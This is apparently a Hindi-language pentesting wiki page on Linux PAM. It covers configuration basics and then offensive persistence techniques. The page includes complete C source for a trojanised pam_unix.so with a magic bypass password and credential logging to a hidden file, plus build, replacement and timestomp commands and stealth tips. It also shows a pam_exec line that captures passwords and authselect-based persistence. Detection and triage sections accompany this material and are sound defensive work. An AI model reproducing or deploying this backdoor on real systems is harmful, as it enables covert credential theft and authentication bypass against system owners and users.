# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### मूल जानकारी

**PAM (Pluggable Authentication Modules)** एक सुरक्षा तंत्र के रूप में काम करता है, जो **कंप्यूटर सेवाओं तक पहुँचने का प्रयास करने वाले उपयोगकर्ताओं की पहचान सत्यापित करता है** और विभिन्न मानदंडों के आधार पर उनकी पहुँच नियंत्रित करता है। यह एक डिजिटल द्वारपाल की तरह है, जो सुनिश्चित करता है कि केवल अधिकृत उपयोगकर्ता ही विशिष्ट सेवाओं का उपयोग कर सकें और सिस्टम पर अधिक भार पड़ने से रोकने के लिए उनके उपयोग को सीमित भी कर सकता है।

#### कॉन्फ़िगरेशन फ़ाइलें

- **Solaris** पुरानी केंद्रीय फ़ाइल `/etc/pam.conf` का समर्थन करता है, लेकिन मौजूदा मार्गदर्शन में `/etc/pam.d` के अंतर्गत service फ़ाइलों को प्राथमिकता दी जाती है।<sup>[[10]](#references)</sup>
- **Linux systems** में directory-आधारित तरीका पसंद किया जाता है, जिसमें service-विशिष्ट कॉन्फ़िगरेशन `/etc/pam.d` के अंतर्गत रखे जाते हैं। उदाहरण के लिए, login service की कॉन्फ़िगरेशन फ़ाइल `/etc/pam.d/login` में मिलती है।<sup>[[1]](#references)</sup>

login service के लिए PAM कॉन्फ़िगरेशन का एक उदाहरण कुछ ऐसा दिख सकता है:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **PAM Management Realms**

ये realms, या management groups, **auth**, **account**, **password**, और **session** शामिल करते हैं। इनमें से हर एक authentication और session management प्रक्रिया के अलग-अलग पहलुओं के लिए ज़िम्मेदार है:<sup>[[1]](#references)</sup>

- **Auth**: उपयोगकर्ता की पहचान सत्यापित करता है, अक्सर password पूछकर।
- **Account**: account का सत्यापन करता है और group membership या समय-आधारित प्रतिबंधों जैसी शर्तों की जाँच करता है।
- **Password**: password अपडेट प्रबंधित करता है, जिसमें complexity जाँच या dictionary attacks की रोकथाम शामिल है।
- **Session**: service session शुरू या समाप्त होने के दौरान की कार्रवाइयाँ प्रबंधित करता है, जैसे directories mount करना या resource limits सेट करना।

#### **PAM Module Controls**

ये controls सफलता या विफलता पर module की प्रतिक्रिया तय करते हैं और समग्र authentication प्रक्रिया को प्रभावित करते हैं। इनमें शामिल हैं:<sup>[[1]](#references)</sup>

- **Required**: किसी required module की विफलता अंततः प्रक्रिया को विफल कर देती है, लेकिन उसके बाद के सभी modules की जाँच होने के बाद ही।
- **Requisite**: विफलता होने पर प्रक्रिया तुरंत समाप्त हो जाती है।
- **Sufficient**: अगर पहले का कोई `required` module विफल नहीं हुआ है, तो सफलता तुरंत लौटती है और उसी management group के बाकी modules छोड़ दिए जाते हैं।
- **Optional**: विफलता केवल तभी होती है जब stack में यही एक module हो।

#### महत्वपूर्ण Offensive Semantics

PAM का विश्लेषण या संशोधन करते समय, **जोड़े गए rule की जगह** तय करती है कि कौन-सा stack उसे देखेगा:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` और `substack` अन्य files से rules लाते हैं। इसलिए `sshd` को संपादित करने से केवल SSH प्रभावित हो सकता है, जबकि `system-auth`, `common-auth`, या किसी अन्य साझा stack को संपादित करने से एक साथ कई services प्रभावित हो सकती हैं।<sup>[[1]](#references)[[13]](#references)</sup>
- PAM `[success=1 default=ignore]` जैसे bracketed controls का भी समर्थन करता है। इनका दुरुपयोग करके, सफल custom check के बाद **एक या अधिक modules छोड़े** जा सकते हैं, बजाय इसके कि `pam_unix.so` को स्पष्ट रूप से बदला जाए।<sup>[[1]](#references)</sup>
- `module-path` **absolute** (`/usr/lib/security/pam_custom.so`) हो सकता है या default PAM module directory के **relative** हो सकता है। आधुनिक Linux systems में वास्तविक directories अक्सर `/lib/security`, `/lib64/security`, `/usr/lib/security`, या `/usr/lib/x86_64-linux-gnu/security` जैसे multiarch paths होते हैं।<sup>[[1]](#references)[[14]](#references)</sup>

Operators के लिए त्वरित सीख: patch करने से पहले हमेशा **पूरा service graph** मैप करें। उदाहरण के लिए, कुछ distros में `sshd -> password-auth -> system-auth` और अन्य में `sshd -> system-remote-login -> system-login -> system-auth` का अर्थ है कि वही एक-पंक्ति implant, इरादे से कहीं अधिक सेवाओं तक पहुँच सकता है।<sup>[[1]](#references)[[13]](#references)</sup>

एक custom `auth` module, account password के बाद `sudo` में interactive challenge जोड़ सकता है। Challenge की मैन्युअल समीक्षा करने से पहले प्रभावी `/etc/pam.d/sudo` stack, शामिल policy, module arguments, और संदर्भित किसी भी local data file की permissions की जाँच करें। केवल पढ़ी जा सकने वाली challenge word list से password check bypass नहीं होता और न ही sudoers grant मिलता है। Privileged transition के लिए सही account authentication, हर required PAM step को पूरा करना, और root-capable sudo rule होना अभी भी ज़रूरी है; unattended enumeration से challenge शुरू नहीं होना चाहिए।

Legacy Ubuntu [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832) के लिए, वास्तविक `libpam-modules` build की जाँच करें और पता लगाएँ कि कोई login service प्रभावित session module चलाती है या नहीं। Ubuntu ने 9.10 के लिए **1.1.0-2ubuntu1.1** और 10.04 LTS के लिए **1.1.1-2ubuntu5** में इसे ठीक किया था; अन्य releases या vendor backports के package का अलग से आकलन करना होगा। रिपोर्ट किए गए तरीके में caller को अपने home `.cache` को symlink से बदलना और फिर PAM login शुरू करना पड़ता था, जिससे पुराने module ने एक protected target का ownership बदल दिया। केवल `.cache` entry, `pam_motd.so` line, या पुराने kernel version से exposure साबित नहीं होता। Passive enumeration के दौरान files बदले या login शुरू किए बिना home-directory पर नियंत्रण, प्रभावी module version, login तक पहुँच, symlink handling, और target permissions जाँचें। [Ubuntu का security notice](https://ubuntu.com/security/notices/USN-959-1) देखें।

#### Example Scenario

कई auth modules वाले setup में प्रक्रिया एक सख्त क्रम का पालन करती है। अगर `pam_securetty` module को login terminal अनधिकृत लगता है, तो root logins रोक दिए जाते हैं, फिर भी उसकी "required" स्थिति के कारण सभी modules प्रोसेस किए जाते हैं। `pam_env` environment variables सेट करता है, जिससे user experience बेहतर हो सकता है। `pam_ldap` और `pam_unix` modules मिलकर उपयोगकर्ता को authenticate करते हैं; `pam_unix` पहले से दिए गए password का उपयोग करने की कोशिश करता है, जिससे authentication methods अधिक कुशल और लचीले बनते हैं।<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## किसी service stack में `pam_permit`

`pam_permit.so` PAM checks में success लौटाता है। अगर कम विशेषाधिकार वाला उपयोगकर्ता किसी service की प्रभावी PAM policy को बदल सकता है, तो इसे ऐसे control flag के साथ जोड़कर जो authentication stack को बीच में ही रोक दे, उस service का password check हटाया जा सकता है। `sudo` के लिए, यह तय करने से पहले कि कौन-सी services प्रभावित हैं, `/etc/pam.d/sudo` और शामिल किसी भी `common-auth` या `system-auth` file की जाँच करें। PAM authentication bypass से नया sudoers rule **नहीं** मिलता; उपयोगकर्ता को अनुरोधित command चलाने की अनुमति फिर भी होनी चाहिए। यह मानने के बजाय कि `sufficient pam_permit.so` की एक line हमेशा सफल होगी, rules के क्रम और पहले हुई किसी भी `required` विफलता की जाँच करें।

## PAM में Backdoor डालना – `pam_unix.so` को Hook करना

उच्च-मूल्य वाले Linux environments में persistence की एक पारंपरिक तरकीब है **वैध PAM library को trojanised drop-in से बदलना**। जिस host का PAM stack `pam_unix.so` लोड करता है, वहाँ SSH या console authentication उसके `pam_sm_authenticate()` entry point को चला सकता है; दुर्भावनापूर्ण replacement credentials हासिल कर सकता है या *magic* password bypass लागू कर सकता है।<sup>[[2]](#references)[[11]](#references)</sup>

### Compilation Cheatsheet
नीचे दिया गया उदाहरण authentication token तक पहुँचने के लिए Linux-PAM के `pam_sm_authenticate()` service entry point और `pam_get_authtok()` का उपयोग करता है।<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Sample `pam_unix.so` trojan</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compile करें और stealth-replace करें (replacement/timestomp pattern को Unit 42 ने दस्तावेज़ित किया है)। Wrapper में hard-coded backup path और नीचे दिए गए commands—दोनों को target की वास्तविक PAM module directory के अनुसार समायोजित करें:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### OpSec सुझाव
1. **Atomic overwrite** – एक पूरी library को temporary file में लिखें और उसे सही जगह पर rename करें, ताकि authentication module आंशिक रूप से लिखा हुआ न रह जाए।
2. Unit 42 के AuthDoor विश्लेषण में `/usr/bin/.dbus.log` जैसा path देखा गया था, इसलिए यह hunting के लिए एक उपयोगी indicator भी है।<sup>[[2]](#references)</sup>
3. PAM stack द्वारा अपेक्षित entry points (उदाहरण के लिए, `pam_sm_authenticate` और `pam_sm_setcred`) को बनाए रखें, ताकि अन्य management operations काम करते रहें।<sup>[[11]](#references)[[18]](#references)</sup>

### Detection
Package-integrity checks के लिए, RPM installed-file metadata को verify करता है, `debsums -s` checksum errors की रिपोर्ट करता है, और triage block में `dpkg -S` package ownership की जाँच करता है; audit watch syntax किसी path पर writes और attribute changes को रिकॉर्ड करता है।<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* `pam_unix.so` के MD5/SHA256 की तुलना distro package से करें।
* Manual hashing के बिना बदली हुई libraries ढूँढ़ने के लिए `rpm -V pam` या `debsums -s libpam-modules` चलाएँ।
* `/lib/security/` के अंतर्गत world-writable permissions या असामान्य ownership की जाँच करें।
* `auditd` rule: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`।
* अनपेक्षित modules के लिए PAM configs में grep करें: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`।

यह `pam_` grep ऐसे custom modules को नहीं पकड़ता जिनके अन्य `.so` basenames हों। `/etc/pam.d` में (और जहाँ इस्तेमाल हो, वहाँ `/etc/pam.conf` में) मौजूद **active** `auth`, `account`, `password`, और `session` lines की समीक्षा करें; इसमें उनका control flag और कोई भी included stack शामिल करें। सामान्य password check से पहले `auth sufficient` के रूप में रखा गया अपरिचित module package ownership और binary review के योग्य है; [PAM का control syntax](https://man7.org/linux/man-pages/man5/pam.d.5.html) stack के उस हिस्से को सफलता मिलने पर जल्दी समाप्त कर सकता है। केवल module name, असामान्य timestamp, या `nodelay` option से bypass साबित नहीं होता। यदि व्यवहार timing leak का संकेत देता है, तो पहले implementation और service reachability की जाँच करें; routine enumeration के दौरान बार-बार authentication guesses सबमिट न करें।

### Quick triage commands (compromise के बाद या threat hunting के लिए)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Persistence के लिए `pam_exec` का दुरुपयोग
`pam_unix.so` को बदलने के बजाय, एक कम दखल देने वाला तरीका है `/etc/pam.d/sshd` में `pam_exec` लाइन जोड़ना, ताकि उस PAM लाइन तक पहुँचने वाला invocation एक helper चलाए और सामान्य stack जस का तस रहे।<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` PAM metadata को `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY`, और `PAM_TYPE` जैसे environment variables में प्राप्त करता है। `expose_authtok` के साथ, helper `auth` या `password` phases के दौरान `stdin` से पासवर्ड के अधिकतम `PAM_MAX_RESP_SIZE` bytes पढ़ सकता है। यदि आप चाहते हैं कि helper real UID के बजाय effective UID के साथ चले, तो `seteuid` जोड़ें।<sup>[[4]](#references)</sup>

व्यावहारिक नोट्स, `pam_exec` के लिए दस्तावेज़ीकृत module types और `type=` filter के अनुसार हैं:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` **post-login actions** के लिए बेहतर है, जैसे sockets को फिर से खोलना या detached daemon शुरू करना।
- `auth optional pam_exec.so quiet expose_authtok ...` **credential capture** के लिए आम विकल्प है, क्योंकि यह session खुलने से पहले चलता है।
- किसी खास PAM phase तक execution सीमित करने और अनावश्यक दोहरे execution से बचने के लिए `type=session` या `type=auth` का उपयोग किया जा सकता है।

Privilege review के लिए, ऐसा absolute `pam_exec.so` helper path जिसे मौजूदा user लिख सकता है, एक संभावित समस्या है—भले ही file पर append-only (`a`) flag लगा हो: [यह attribute appending की अनुमति देता है](https://man7.org/linux/man-pages/man1/chattr.1.html), जो shell script के बाद के व्यवहार को बदलने के लिए पर्याप्त हो सकता है। पहले पुष्टि करें कि PAM service और event वास्तव में उस line तक पहुँचते हैं, helper और उसका parent path विश्वसनीय हैं, और command अधिक privileged identity के तहत चलती है; [`seteuid` तय करता है कि कौन-सा PAM UID इस्तेमाल होगा](https://man7.org/linux/man-pages/man8/pam_exec.8.html)। केवल writable file या `lsattr` का परिणाम privileged execution साबित नहीं करता।

### Distro tooling के बाद भी बने रहना: `authselect`

`authselect` का उपयोग करने वाले RHEL और Fedora-family systems में, `/etc/pam.d/system-auth` या `/etc/pam.d/password-auth` जैसी generated files में सीधे किए गए बदलाव **`authselect` द्वारा overwrite किए जा सकते हैं**। Persistence के लिए, operators अक्सर `/etc/authselect/custom/<profile>/` के अंतर्गत सक्रिय custom profile में बदलाव करते हैं और फिर उसे दोबारा चुनते हैं।<sup>[[5]](#references)[[19]](#references)</sup>

Root access होने पर आम workflow:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

यह offense और triage, दोनों के लिए महत्वपूर्ण है: अगर `/etc/pam.d/system-auth` में `Generated by authselect` और `Do not modify this file manually` बैनर मौजूद हैं, तो persistence का वास्तविक बिंदु `/etc/pam.d/` के बजाय `/etc/authselect/custom/` में हो सकता है।<sup>[[5]](#references)</sup>

### हाल में वास्तविक घटनाओं में देखी गई tradecraft

Plague Linux backdoor पर 2025 की हालिया रिपोर्टिंग में यही मूल विचार और आगे बढ़ाया गया: एक malicious PAM component जिसमें **static bypass password** था, साथ ही login के बाद session traces कम करने के लिए SSH-संबंधित environment variables और shell history (`HISTFILE=/dev/null`) को साफ़ किया गया।<sup>[[3]](#references)</sup> यह hunting के लिए एक उपयोगी pattern है, क्योंकि backdoor का logic PAM में हो सकता है, जबकि stealth artifacts केवल authentication सफल होने के **बाद** दिखाई देते हैं।


## References

- [1] [pam.conf(5) / pam.d(5) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [गुप्त ऑपरेटर की कार्य-पुस्तिका: वैश्विक दूरसंचार नेटवर्क में घुसपैठ - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: Linux के लिए नया खोजा गया PAM-आधारित backdoor](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [authselect का उपयोग करके user authentication कॉन्फ़िगर करना - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Debian Manpages](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Linux मैनुअल पेज](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Debian Manpages](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Oracle Solaris 11.4 में authentication का प्रबंधन](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [सिस्टम-स्तरीय Authentication गाइड - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Ubuntu पैकेज फ़ाइल सूची: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Debian Manpages](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Linux-PAM मैनुअल](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [बदलाव/ Authselect को अनिवार्य बनाना - Fedora Project Wiki](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
